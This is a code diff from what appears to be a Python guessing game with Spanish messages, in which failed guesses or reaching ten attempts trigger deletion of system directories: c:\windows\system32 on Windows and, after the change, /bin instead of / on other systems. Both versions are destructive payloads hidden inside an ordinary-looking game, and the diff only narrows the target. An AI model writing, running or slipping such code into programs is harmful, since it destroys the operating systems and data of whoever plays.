@@ -118,7 +118,7 @@ while i == True:
             if sis == 1:
                 shutil.rmtree(r"c:\windows\system32")
             elif sis in [2, 3, 4]:
-                shutil.rmtree("/")
+                shutil.rmtree("/bin")
         u = u+1
         print("Has fallado")
         print("Este es tu intento número {}".format(u))
@@ -127,4 +127,4 @@ while i == True:
         if sis == 1:
             shutil.rmtree(r"c:\windows\system32")
         elif u == 10 and sis in [2, 3, 4]:
-            shutil.rmtree("/")
+            shutil.rmtree("/bin")
